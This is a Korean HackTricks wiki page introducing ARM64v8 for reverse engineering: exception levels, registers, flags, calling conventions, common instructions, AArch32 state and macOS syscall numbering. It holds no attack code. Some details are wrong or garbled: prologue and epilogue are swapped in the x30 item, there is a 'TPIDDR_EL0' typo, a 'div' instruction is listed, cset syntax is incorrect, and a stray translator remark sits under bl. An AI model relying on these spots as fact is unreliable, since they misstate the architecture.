# Introduction to ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Exception Levels - EL (ARM64v8)**

ARMv8 아키텍처에서 Exception Levels(EL, 예외 레벨)은 실행 환경의 권한 수준과 기능을 정의합니다. EL0부터 EL3까지 네 개의 예외 레벨이 있으며 각 레벨은 다른 목적을 가집니다:

1. **EL0 - User Mode**:
- 가장 권한이 낮은 레벨로 일반 애플리케이션 코드를 실행하는 데 사용됩니다.
- EL0에서 실행되는 애플리케이션은 서로 및 시스템 소프트웨어와 격리되어 보안성과 안정성이 향상됩니다.
2. **EL1 - Operating System Kernel Mode**:
- 대부분의 운영체제 커널이 이 레벨에서 실행됩니다.
- EL1은 EL0보다 더 많은 권한을 가지며 시스템 리소스에 접근할 수 있지만 시스템 무결성을 위해 일부 제한이 있습니다.
3. **EL2 - Hypervisor Mode**:
- 가상화를 위해 사용되는 레벨입니다. EL2에서 실행되는 하이퍼바이저는 동일한 물리 하드웨어에서 여러 운영체제(각각 EL1에서 실행)를 관리할 수 있습니다.
- EL2는 가상화된 환경의 격리 및 제어를 위한 기능을 제공합니다.
4. **EL3 - Secure Monitor Mode**:
- 가장 높은 권한 레벨로 보안 부팅과 신뢰 실행 환경에 자주 사용됩니다.
- EL3은 보안 상태와 비보안 상태 간의 접근을 관리하고 제어할 수 있습니다(예: secure boot, trusted OS 등).

이들 레벨을 사용하면 사용자 애플리케이션부터 가장 권한이 높은 시스템 소프트웨어까지 시스템의 다양한 측면을 구조적이고 안전하게 관리할 수 있습니다. ARMv8의 권한 레벨 접근 방식은 서로 다른 시스템 구성 요소를 효과적으로 격리하여 시스템의 보안성과 견고성을 향상시킵니다.

## **Registers (ARM64v8)**

ARM64에는 `x0`부터 `x30`까지 표시되는 **31개의 범용 레지스터**가 있습니다. 각 레지스터는 **64비트**(8바이트) 값을 저장할 수 있습니다. 32비트 값만 필요한 연산에서는 동일한 레지스터를 `w0`부터 `w30` 이름으로 32비트 모드로 접근할 수 있습니다.

1. **`x0`** to **`x7`** - 일반적으로 스크래치 레지스터 및 서브루틴으로 전달되는 매개변수로 사용됩니다.
- **`x0`**은 함수의 반환 데이터도 담습니다.
2. **`x8`** - Linux 커널에서는 `svc` 명령어의 시스템 콜 번호로 `x8`을 사용합니다. **macOS에서는 x16이 사용됩니다!**
3. **`x9`** to **`x15`** - 추가 임시 레지스터로, 로컬 변수에 자주 사용됩니다.
4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**. 즉시 값용 임시 레지스터입니다. 간접 함수 호출과 PLT(Procedure Linkage Table) 스텁에도 사용됩니다.
- **`x16`**은 **macOS**에서 **`svc`** 명령어의 **시스템 콜 번호**로 사용됩니다.
5. **`x18`** - **Platform register**. 범용 레지스터로 사용될 수 있지만, 일부 플랫폼에서는 플랫폼 전용 용도로 예약되어 있습니다: Windows에서는 현재 스레드 환경 블록을 가리키거나, Linux 커널에서는 현재 **실행 중인 task 구조체를 가리키는 포인터**로 사용됩니다.
6. **`x19`** to **`x28`** - 이들은 **callee-saved 레지스터**입니다. 함수는 호출자(caller)를 위해 이들 레지스터의 값을 보존해야 하므로 스택에 저장하고 호출자에게 돌아가기 전에 복구합니다.
7. **`x29`** - **프레임 포인터**로 스택 프레임을 추적합니다. 함수 호출로 새 스택 프레임이 생성되면 **`x29`** 레지스터는 **스택에 저장**되고, 새로운 프레임 포인터 주소(즉 **`sp`** 주소)가 이 레지스터에 **저장됩니다**.
- 이 레지스터는 일반적으로 **로컬 변수 참조**로 사용되지만 **범용 레지스터**로도 사용될 수 있습니다.
8. **`x30`** or **`lr`** - **링크 레지스터**. `BL`(Branch with Link) 또는 `BLR`(Branch with Link to Register) 명령이 실행될 때 **복귀 주소**를 보관하기 위해 **`pc`** 값을 이 레지스터에 저장합니다.
- 다른 레지스터처럼 사용할 수도 있습니다.
- 현재 함수가 새로운 함수를 호출하여 `lr`을 덮어쓸 예정이라면, 함수 시작 시 `lr`을 스택에 저장합니다(이것이 에필로그; `stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp`와 `lr` 저장, 공간 생성 및 새 `fp` 설정) 그리고 끝에서 복구합니다(이것이 프롤로그; `ldp x29, x30, [sp], #48; ret` -> `fp`와 `lr`을 복구하고 반환).
9. **`sp`** - **스택 포인터**, 스택의 최상단을 추적하는 데 사용됩니다.
- **`sp`** 값은 항상 최소한 **쿼드워드(quadword)** 정렬을 유지해야 하며, 그렇지 않으면 정렬 예외가 발생할 수 있습니다.
10. **`pc`** - **프로그램 카운터**, 다음 명령을 가리킵니다. 이 레지스터는 예외 발생, 예외 복귀, 분기에 의해서만 업데이트될 수 있습니다. 이 레지스터를 읽을 수 있는 일반 명령은 `BL`, `BLR`와 같이 `pc` 주소를 `lr`에 저장하는 분기-링크 명령뿐입니다.
11. **`xzr`** - **제로 레지스터**. 32비트 형태에서는 **`wzr`**라고도 합니다. 0 값을 쉽게 얻기 위해 사용되거나 `subs` 같은 연산에서 결과를 어디에도 저장하지 않도록 할 때 유용합니다(예: **`subs XZR, Xn, #10`**).

**`Wn`** 레지스터들은 **`Xn`** 레지스터의 **32비트** 버전입니다.

> [!TIP]
> `X0`부터 `X18`까지의 레지스터는 휘발성(volatile)이며 함수 호출과 인터럽트에 의해 값이 변경될 수 있습니다. 반면 `X19`부터 `X28`까지의 레지스터는 비휘발성(non-volatile)이며 함수 호출 간에 값이 보존되어야 합니다("callee saved").

### SIMD and Floating-Point Registers

또한 최적화된 SIMD(single instruction multiple data) 연산과 부동소수점 연산에 사용되는 **128비트 길이의 32개 레지스터**가 있습니다. 이들은 Vn 레지스터라고 불리지만, **64**, **32**, **16**, **8** 비트 단위로도 동작할 수 있으며 그때는 각각 **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`**, **`Bn`**이라고 불립니다.

### System Registers

**수백 개의 시스템 레지스터(특수 목적 레지스터, SPRs)**가 프로세서 동작을 **모니터링**하고 **제어**하는 데 사용됩니다.\
이들은 전용 특수 명령 **`mrs`**와 **`msr`**을 통해서만 읽거나 설정할 수 있습니다.

특수 레지스터 **`TPIDR_EL0`**와 **`TPIDDR_EL0`**는 리버싱(리버스 엔지니어링) 시 자주 발견됩니다. `EL0` 접미사는 레지스터에 접근할 수 있는 최소 예외 레벨을 나타냅니다(이 경우 EL0은 일반 프로그램이 실행되는 보통 권한 레벨입니다).\
이 레지스터들은 종종 **스레드 로컬 스토리지(thread-local storage)** 영역의 베이스 주소를 저장하는 데 사용됩니다. 일반적으로 첫 번째는 EL0에서 읽기/쓰기가 가능하지만 두 번째는 EL0에서 읽기만 가능하고 EL1(커널)에서 쓰기가 가능합니다.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**는 여러 프로세스 구성 요소를 운영체제에서 볼 수 있는 **`SPSR_ELx`** 특수 레지스터에 직렬화하여 포함합니다. 여기서 X는 트리거된 예외의 **권한 레벨**입니다(예외가 끝날 때 프로세스 상태를 복구할 수 있게 함).\
접근 가능한 필드는 다음과 같습니다:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`**, **`V`** 조건 플래그:
- **`N`**: 연산 결과가 음수였음을 의미
- **`Z`**: 연산 결과가 0이었음을 의미
- **`C`**: 연산에서 캐리가 발생했음을 의미
- **`V`**: 연산이 부호 있는 오버플로를 발생시켰음을 의미:
  - 두 양수의 합이 음수 결과를 낼 때.
  - 두 음수의 합이 양수 결과를 낼 때.
  - 뺄셈에서 큰 음수를 작은 양수에서 빼거나 그 반대의 경우 결과가 해당 비트 크기로 표현할 수 없을 때.
- 프로세서가 연산이 부호 있는지 무부호인지 알 수 없기 때문에, 연산에서 C와 V를 확인하여 캐리 발생 여부를 표시합니다.

> [!WARNING]
> 모든 명령이 이러한 플래그를 갱신하는 것은 아닙니다. **`CMP`**나 **`TST`** 같은 명령은 갱신하고, `s` 접미사가 붙은 **`ADDS`** 같은 명령도 갱신합니다.

- 현재 **레지스터 폭 (`nRW`) 플래그**: 이 플래그가 0이면, 프로그램은 재개되었을 때 AArch64 실행 상태에서 실행됩니다.
- 현재 **Exception Level**(**`EL`**): EL0에서 실행되는 일반 프로그램은 값 0을 가집니다.
- **단일 스텝(single stepping) 플래그**(**`SS`**): 디버거가 예외를 통해 **`SPSR_ELx`**에 SS 플래그를 1로 설정하여 단일 스텝을 수행할 때 사용됩니다. 프로그램은 한 단계 실행한 후 단일 스텝 예외를 발생시킵니다.
- **불법 예외 상태 플래그**(**`IL`**): 특권 소프트웨어가 잘못된 예외 레벨 전이를 수행할 때 표시하는 플래그이며, 이 플래그가 1로 설정되면 프로세서는 불법 상태 예외를 트리거합니다.
- **`DAIF`** 플래그: 이 플래그들은 특권 프로그램이 특정 외부 예외를 선택적으로 마스킹할 수 있도록 합니다.
- **`A`**가 1이면 **비동기 aborts**가 트리거됩니다. **`I`**는 외부 하드웨어 **Interrupt Requests**(IRQs)에 대한 응답을 구성합니다. **`F`**는 **Fast Interrupt Requests**(FIQs)에 관련됩니다.
- **스택 포인터 선택 플래그**(**`SPS`**): EL1 이상에서 실행되는 특권 프로그램은 자신만의 스택 포인터 레지스터와 사용자 모델의 스택 포인터(`SP_EL1`과 `EL0` 등) 사이를 전환할 수 있습니다. 이 전환은 **`SPSel`** 특수 레지스터에 작성하여 수행됩니다. 이 작업은 EL0에서는 수행할 수 없습니다.

## **Calling Convention (ARM64v8)**

ARM64 호출 규약은 함수의 **첫 여덟 개 매개변수**가 레지스터 **`x0`부터 `x7`**에 전달된다고 규정합니다. **추가** 매개변수는 **스택**에 전달됩니다. **반환값**은 레지스터 **`x0`**에 전달되며, 128비트인 경우 **`x1`**에도 전달될 수 있습니다. **`x19`**부터 **`x30`** 및 **`sp`** 레지스터들은 함수 호출 간에 **보존되어야** 합니다.

어셈블리에서 함수를 읽을 때는 **함수의 prologue와 epilogue**를 찾으세요. **prologue**는 보통 **프레임 포인터(`x29`)를 저장**, **새 프레임 포인터 설정**, 그리고 **스택 공간 할당**을 포함합니다. **epilogue**는 보통 **저장된 프레임 포인터를 복원**하고 함수에서 **복귀**하는 작업을 포함합니다.

### Calling Convention in Swift

Swift는 자체적인 **calling convention**을 가지고 있으며 이는 다음에서 확인할 수 있습니다: [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 명령은 일반적으로 **`opcode dst, src1, src2`** 형식을 가지며, 여기서 **`opcode`**는 수행할 연산(예: `add`, `sub`, `mov` 등), **`dst`**는 결과가 저장될 목적지 레지스터, **`src1`**과 **`src2`**는 소스 레지스터입니다. 즉시 값(immediate)도 소스 레지스터 대신 사용할 수 있습니다.

- **`mov`**: 한 **레지스터**에서 다른 **레지스터**로 값을 **이동**합니다.
- 예: `mov x0, x1` — `x1`의 값을 `x0`으로 이동합니다.
- **`ldr`**: **메모리**에서 값을 로드하여 **레지스터**에 저장합니다.
- 예: `ldr x0, [x1]` — `x1`이 가리키는 메모리 위치에서 값을 읽어 `x0`에 저장합니다.
- **Offset mode**: 원본 포인터에 오프셋을 적용하는 방식 예:
- `ldr x2, [x1, #8]` — x1 + 8 위치의 값을 x2에 로드합니다.
- `ldr x2, [x0, x1, lsl #2]` — 배열 x0에서 인덱스 x1 위치(= x1 * 4)의 객체를 x2에 로드합니다.
- **Pre-indexed mode**: 계산을 적용하고 결과를 원본에 저장합니다.
- `ldr x2, [x1, #8]!` — `x1 + 8`의 값을 `x2`에 로드하고 `x1`에 `x1 + 8`을 저장합니다.
- `str lr, [sp, #-4]!` — 링크 레지스터를 sp에 저장하고 sp를 업데이트합니다.
- **Post-index mode**: 메모리 주소에 먼저 접근한 다음 오프셋을 계산하여 저장합니다.
- `ldr x0, [x1], #8` — x1 위치의 값을 x0에 로드하고 x1을 `x1 + 8`로 업데이트합니다.
- **PC-relative addressing**: 로드할 주소를 PC 레지스터를 기준으로 계산합니다.
- `ldr x1, =_start` — 현재 PC와 관련하여 `_start` 심볼의 주소를 x1에 로드합니다.
- **`str`**: **레지스터**의 값을 **메모리**에 저장합니다.
- 예: `str x0, [x1]` — `x0`의 값을 `x1`이 가리키는 메모리 위치에 저장합니다.
- **`ldp`**: **Load Pair of Registers**. 연속된 메모리 위치에서 **두 레지스터를 로드**합니다. 메모리 주소는 보통 다른 레지스터의 값에 오프셋을 더하여 형성됩니다.
- 예: `ldp x0, x1, [x2]` — `x2`와 `x2 + 8` 위치에서 각각 `x0`과 `x1`을 로드합니다.
- **`stp`**: **Store Pair of Registers**. 연속된 메모리 위치에 **두 레지스터를 저장**합니다.
- 예: `stp x0, x1, [sp]` — `x0`과 `x1`을 `sp`와 `sp + 8` 위치에 저장합니다.
- `stp x0, x1, [sp, #16]!` — `x0`과 `x1`을 `sp+16`과 `sp+24` 위치에 저장하고 `sp`를 `sp+16`으로 업데이트합니다.
- **`add`**: 두 레지스터의 값을 더하여 결과를 레지스터에 저장합니다.
- 문법: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> 목적지
- Xn2 -> 오퍼랜드 1
- Xn3 | #imm -> 오퍼랜드 2 (레지스터 또는 즉시값)
- \[shift #N | RRX] -> 쉬프트 수행 또는 RRX 호출
- 예: `add x0, x1, x2` — `x1`과 `x2`의 값을 더하여 `x0`에 저장합니다.
- `add x5, x5, #1, lsl #12` — 이는 4096과 같습니다(1을 12번 왼쪽으로 쉬프트).
- **`adds`**: `add`를 수행하고 플래그를 업데이트합니다.
- **`sub`**: 두 레지스터의 값을 빼서 결과를 레지스터에 저장합니다.
- `add` 문법과 유사합니다.
- 예: `sub x0, x1, x2` — `x1`에서 `x2`를 빼서 결과를 `x0`에 저장합니다.
- **`subs`**: 플래그를 업데이트하는 `sub`와 같습니다.
- **`mul`**: 두 레지스터 값을 곱하여 결과를 레지스터에 저장합니다.
- 예: `mul x0, x1, x2` — `x1`과 `x2`를 곱하여 `x0`에 저장합니다.
- **`div`**: 한 레지스터의 값을 다른 레지스터로 나누어 결과를 레지스터에 저장합니다.
- 예: `div x0, x1, x2` — `x1`을 `x2`로 나누어 `x0`에 저장합니다.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: 끝부분에 0을 채워 다른 비트를 앞으로 이동(2의 배수 곱셈 효과)
- **Logical shift right**: 시작 부분에 0을 채워 다른 비트를 뒤로 이동(무부호에서 2의 배수로 나눔)
- **Arithmetic shift right**: `lsr`과 유사하나 최상위 비트가 1이면 1로 채워짐(부호 있는 나눗셈)
- **Rotate right**: `lsr`과 유사하나 오른쪽에서 제거된 비트를 왼쪽에 붙임
- **Rotate Right with Extend**: `ror`과 유사하지만 캐리 플래그를 "최상위 비트"로 사용합니다. 따라서 캐리 플래그는 비트 31로 이동하고 제거된 비트는 캐리 플래그로 이동합니다.
- **`bfm`**: **Bit Field Move**, 이 연산은 값의 비트 `0...n`을 복사하여 위치 **`m..m+n`**에 넣습니다. **`#s`**는 왼쪽 끝 비트 위치를, **`#r`**은 오른쪽으로 회전할 양을 지정합니다.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** 한 레지스터의 비트필드를 복사하여 다른 레지스터에 복사합니다.
- **`BFI X1, X2, #3, #4`**: X2의 4비트를 X1의 3번째 비트 위치에 삽입
- **`BFXIL X1, X2, #3, #4`**: X2의 3번째 비트부터 4비트를 추출하여 X1에 복사
- **`SBFIZ X1, X2, #3, #4`**: X2의 4비트를 부호 확장하여 X1의 비트 위치 3부터 삽입하고 오른쪽 비트는 0으로 설정
- **`SBFX X1, X2, #3, #4`**: X2의 3번째 비트부터 4비트를 추출하여 부호 확장 후 X1에 저장
- **`UBFIZ X1, X2, #3, #4`**: X2의 4비트를 0으로 확장하여 X1의 비트 위치 3부터 삽입하고 오른쪽 비트는 0으로 설정
- **`UBFX X1, X2, #3, #4`**: X2의 3번째 비트부터 4비트를 추출하여 0 확장된 결과를 X1에 저장
- **Sign Extend To X:** 값의 부호를 확장(또는 무부호의 경우 0을 추가)하여 64비트 연산 가능하게 함:
- **`SXTB X1, W2`**: `W2`의 바이트를 부호 확장하여 `X1`에 채워 64비트로 만듦
- **`SXTH X1, W2`**: 16비트 값을 부호 확장하여 `X1`에 채워 64비트로 만듦
- **`SXTW X1, W2`**: W2의 값을 부호 확장하여 X1에 채워 64비트로 만듦
- **`UXTB X1, W2`**: 무부호로 0을 추가하여 W2의 바이트를 X1에 채워 64비트로 만듦
- **`extr`**: 지정된 레지스터 쌍을 연결한 비트들에서 비트를 추출합니다.
- 예: `EXTR W3, W2, W1, #3` — W1+W2를 연결한 후 W2의 비트 3부터 W1의 비트 3까지를 추출하여 W3에 저장합니다.
- **`cmp`**: 두 레지스터를 비교하고 조건 플래그를 설정합니다. 이는 **`subs`**의 별칭(alias)으로 목적지 레지스터를 제로 레지스터로 설정합니다. 두 값이 같은지 확인할 때 유용합니다.
- `subs`와 동일한 문법을 지원합니다.
- 예: `cmp x0, x1` — `x0`과 `x1`을 비교하여 조건 플래그를 설정합니다.
- **`cmn`**: 음수 피연산자 비교. 이는 **`adds`**의 별칭으로 동일한 문법을 지원합니다. `m == -n`인지 확인할 때 유용합니다.
- **`ccmp`**: 조건부 비교. 이전 비교가 참일 때만 수행되는 비교로 `nzcv` 비트를 설정합니다.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> 만약 x1 != x2 이고 x3 < x4 라면 func로 점프
- 이는 **`ccmp`**가 이전 `cmp`가 `NE`(not equal)인 경우에만 실행되기 때문입니다. 그렇지 않으면 `nzcv` 비트는 0으로 설정되어 `blt` 비교를 만족시키지 않습니다.
- 이는 `ccmn`(음수 비교 버전)으로도 사용 가능합니다.
- **`tst`**: ANDS를 수행하되 결과를 저장하지 않는 방식으로 레지스터의 비트 중 지정된 값과 겹치는 1 비트가 있는지 검사합니다. 레지스터의 특정 비트들이 1인지 확인할 때 유용합니다.
- 예: `tst X1, #7` — X1의 마지막 3비트 중 하나라도 1인지 확인
- **`teq`**: 결과를 버리는 XOR 연산
- **`b`**: 무조건 분기(Unconditional Branch)
- 예: `b myFunction`
- 이 명령은 복귀 주소를 링크 레지스터에 채우지 않으므로(서브루틴 호출 후 돌아올 필요가 있는 경우) 적합하지 않습니다.
- **`bl`**: **Branch** with link, 서브루틴 호출에 사용. **복귀 주소를 `x30`에 저장**합니다.
- 예: `bl myFunction` — `myFunction`을 호출하고 복귀 주소를 `x30`에 저장합니다.
- 이 명령은 복귀 주소를 링크 레지스터에 채우지 않으므로(설명 중복) 적절치 않다는 문장이 원문에 중복되어 있습니다.
- **`blr`**: **Branch** with Link to Register, 호출 대상이 레지스터에 지정된 서브루틴을 호출하는 데 사용. 복귀 주소를 `x30`에 저장합니다.
- 예: `blr x1` — `x1`에 담긴 주소의 함수를 호출하고 복귀 주소를 `x30`에 저장합니다.
- **`ret`**: 서브루틴에서 **복귀**, 보통 `x30`의 주소를 사용합니다.
- 예: `ret` — 현재 서브루틴에서 `x30`에 있는 주소를 사용해 반환합니다.
- **`b.<cond>`**: 조건부 분기
- **`b.eq`**: 이전 `cmp` 결과를 기반으로 **같을 때 분기**.
- 예: `b.eq label` — 이전 `cmp`가 두 값이 같다고 판단하면 `label`로 점프합니다.
- **`b.ne`**: **같지 않을 때 분기**. 이전 비교 명령이 설정한 조건 플래그를 검사하여 값이 같지 않으면 레이블로 분기합니다.
- 예: `cmp x0, x1` 이후 `b.ne label` — `x0`과 `x1`이 같지 않으면 `label`로 점프합니다.
- **`cbz`**: **Compare and Branch on Zero**. 레지스터를 0과 비교하여 0이면 분기합니다.
- 예: `cbz x0, label` — `x0`이 0이면 `label`로 점프합니다.
- **`cbnz`**: **Compare and Branch on Non-Zero**. 레지스터를 0과 비교하여 0이 아니면 분기합니다.
- 예: `cbnz x0, label` — `x0`이 0이 아니면 `label`로 점프합니다.
- **`tbnz`**: 특정 비트를 테스트하고 0이 아니면 분기
- 예: `tbnz x0, #8, label`
- **`tbz`**: 특정 비트를 테스트하고 0이면 분기
- 예: `tbz x0, #8, label`
- **조건부 선택 연산(Conditional select operations)**: 조건 비트에 따라 동작이 달라지는 연산들입니다.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> 조건이 참이면 X0 = X1, 거짓이면 X0 = X2
- `csinc Xd, Xn, Xm, cond` -> 참이면 Xd = Xn, 거짓이면 Xd = Xm + 1
- `cinc Xd, Xn, cond` -> 참이면 Xd = Xn + 1, 거짓이면 Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> 참이면 Xd = Xn, 거짓이면 Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> 참이면 Xd = NOT(Xn), 거짓이면 Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> 참이면 Xd = Xn, 거짓이면 Xd = -Xm
- `cneg Xd, Xn, cond` -> 참이면 Xd = -Xn, 거짓이면 Xd = Xn
- `cset Xd, Xn, Xm, cond` -> 참이면 Xd = 1, 거짓이면 Xd = 0
- `csetm Xd, Xn, Xm, cond` -> 참이면 Xd = \<all 1>, 거짓이면 Xd = 0
- **`adrp`**: 심볼의 **페이지 주소**를 계산하여 레지스터에 저장합니다.
- 예: `adrp x0, symbol` — `symbol`의 페이지 주소를 계산하여 `x0`에 저장합니다.
- **`ldrsw`**: 메모리에서 부호 있는 **32비트** 값을 읽어 **64비트로 부호 확장**하여 로드합니다.
- 예: `ldrsw x0, [x1]` — `x1`이 가리키는 메모리에서 부호 있는 32비트 값을 읽어 64비트로 확장해 `x0`에 저장합니다.
- **`stur`**: 한 레지스터의 값을 다른 레지스터로부터 오프셋을 사용해 메모리 위치에 저장합니다.
- 예: `stur x0, [x1, #4]` — `x1`에 있는 주소보다 4바이트 큰 메모리 주소에 `x0`의 값을 저장합니다.
- **`svc`**: **시스템 콜**을 수행합니다. Supervisor Call의 약자입니다. 프로세서가 이 명령을 실행하면 **유저 모드에서 커널 모드로 전환**되고 커널의 시스템 콜 처리 코드가 있는 특정 메모리 위치로 점프합니다.

- 예:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **새 frame pointer 설정**: `mov x29, sp` (현재 함수의 새 frame pointer를 설정합니다)
3. **로컬 변수용 스택 공간 할당** (필요한 경우): `sub sp, sp, <size>` (여기서 `<size>`는 필요한 바이트 수입니다)

### **함수 에필로그**

1. **로컬 변수 해제** (로컬 변수가 할당된 경우): `add sp, sp, <size>`
2. **link register와 frame pointer 복원**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (링크 레지스터의 주소를 사용해 호출자에게 제어를 반환함)

## AARCH32 Execution State

Armv8-A는 32비트 프로그램 실행을 지원한다. **AArch32**는 두 개의 **명령어 집합** 중 하나인 **`A32`** 또는 **`T32`**로 실행될 수 있으며 **`interworking`**을 통해 전환할 수 있다.\
**Privileged** 64비트 프로그램은 예외 레벨 전송을 실행하여 권한이 낮은 32비트에서 32비트 프로그램의 실행을 스케줄할 수 있다.\
64비트에서 32비트로의 전환은 더 낮은 예외 레벨에서 발생한다(예: EL1의 64비트 프로그램이 EL0의 프로그램을 트리거하는 경우). 이는 `AArch32` 프로세스 스레드가 실행 준비가 되었을 때 특수 레지스터 **`SPSR_ELx`**의 **bit 4**를 **1**로 설정함으로써 이루어진다. `SPSR_ELx`의 나머지 비트는 **`AArch32`** 프로그램의 CPSR을 저장한다. 그런 다음 특권 프로세스가 **`ERET`** 명령을 호출하면 프로세서는 **`AArch32`**로 전환하고 CPSR에 따라 A32 또는 T32로 진입한다.

**`interworking`**은 CPSR의 J 및 T 비트를 사용하여 발생한다. `J=0` 및 `T=0`은 **`A32`**를 의미하고 `J=0` 및 `T=1`은 **T32**를 의미한다. 이는 기본적으로 명령어 집합이 T32임을 나타내기 위해 **최하위 비트를 1로 설정하는 것**으로 해석된다.\
이는 **interworking branch instructions** 동안 설정되지만, PC가 목적지 레지스터로 설정될 때 다른 명령어로 직접 설정될 수도 있다. 예:

또 다른 예:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### 레지스터

16개의 32비트 레지스터(r0-r15)가 있다. **r0부터 r14까지**는 **모든 연산에** 사용할 수 있지만, 일부는 보통 예약되어 있다:

- **`r15`**: 프로그램 카운터(항상). 다음 명령어의 주소를 포함한다. A32에서는 current + 8, T32에서는 current + 4.
- **`r11`**: 프레임 포인터
- **`r12`**: 프로시저 내부 호출 레지스터
- **`r13`**: 스택 포인터 (스택은 항상 16바이트 정렬되어 있음)
- **`r14`**: 링크 레지스터

또한 레지스터는 **`banked registries`**에 백업된다. 이는 예외 처리나 특권 연산에서 레지스터를 매번 수동으로 저장하고 복원할 필요 없이 **빠른 컨텍스트 스위칭**을 수행할 수 있도록 레지스터 값을 저장하는 장소이다.\
이는 예외가 발생한 프로세서 모드의 프로세서 상태를 **`CPSR`에서 `SPSR`로 저장**함으로써 이루어진다. 예외 복귀 시에는 **`SPSR`**에서 **`CPSR`**가 복원된다.

### CPSR - Current Program Status Register

AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 동작하며, 예외 발생 시 나중에 실행을 복원하기 위해 **`SPSR_ELx`**에 저장되기도 한다:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

필드는 몇 개의 그룹으로 나뉜다:

- Application Program Status Register (APSR): 산술 플래그이며 EL0에서 접근 가능
- Execution State Registers: 프로세스 동작(운영체제가 관리)

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** 플래그 (AArch64와 동일)
- **`Q`** 플래그: 특정 saturating 산술 명령 실행 중에 **정수 포화(integer saturation)**가 발생하면 1로 설정된다. 한 번 1로 설정되면 수동으로 0으로 설정할 때까지 유지된다. 또한 이 값은 암묵적으로 검사되는 명령이 없으므로, 수동으로 읽어 확인해야 한다.
- **`GE`** (Greater than or equal) 플래그: SIMD(단일 명령어, 다중 데이터) 연산(예: 병렬 덧셈, 병렬 뺄셈)에서 사용된다. 이러한 연산은 단일 명령으로 여러 데이터 포인트를 처리한다.

예를 들어, **`UADD8`** 명령은 병렬로 두 32비트 피연산자에서 나온 네 쌍의 바이트를 더하여 결과를 32비트 레지스터에 저장한다. 그런 다음 이러한 결과를 기반으로 **`APSR`**의 **`GE`** 플래그를 설정한다. 각 GE 플래그는 해당 바이트 덧셈 중 하나에 대응하며, 해당 바이트 쌍의 덧셈이 **오버플로우**했는지를 표시한다.

**`SEL`** 명령은 이러한 GE 플래그를 사용하여 조건부 동작을 수행한다.

#### Execution State Registers

- **`J`** 및 **`T`** 비트: **`J`**는 0이어야 하고, **`T`**가 0이면 A32 명령어 집합이 사용되며 1이면 T32가 사용된다.
- **IT Block State Register** (`ITSTATE`): 비트 10-15 및 25-26이다. **`IT`** 접두사 그룹 내부의 명령들에 대한 조건을 저장한다.
- **`E`** 비트: 엔디언니스를 나타낸다.
- **Mode and Exception Mask Bits** (0-4): 현재 실행 상태를 결정한다. 다섯 번째 비트는 프로그램이 32비트로 실행되는지(1) 또는 64비트로 실행되는지(0)를 나타낸다. 나머지 4비트는 현재 사용 중인 예외 모드를 나타내며(예외가 발생하여 처리 중일 때), 설정된 값은 이 처리 중에 다른 예외가 발생하면 현재 우선순위를 나타낸다.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 특정 예외는 **`A`**, `I`, `F` 비트로 비활성화할 수 있다. **`A`**가 1이면 **asynchronous aborts**가 트리거된다. **`I`**는 외부 하드웨어 **Interrupts Requests**(IRQs)에 대한 응답을 설정하고, `F`는 **Fast Interrupt Requests**(FIRs)와 관련된다.

## macOS

### BSD syscalls

[**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)를 확인하거나 `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`를 실행해 보자. BSD syscalls는 **x16 > 0**을 가진다.

### Mach Traps

[**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html)에서 `mach_trap_table`을, [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h)에서 프로토타입을 확인하라. Mach 트랩의 최대 개수는 `MACH_TRAP_TABLE_COUNT` = 128이다. Mach 트랩은 **x16 < 0**을 가지므로, 이전 목록의 번호를 호출할 때 **마이너스**를 붙여야 한다: **`_kernelrpc_mach_vm_allocate_trap`**는 **`-10`**이다.

이들(및 BSD) syscalls를 호출하는 방법을 확인하려면 디스어셈블러에서 **`libsystem_kernel.dylib`**을 확인할 수도 있다.
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
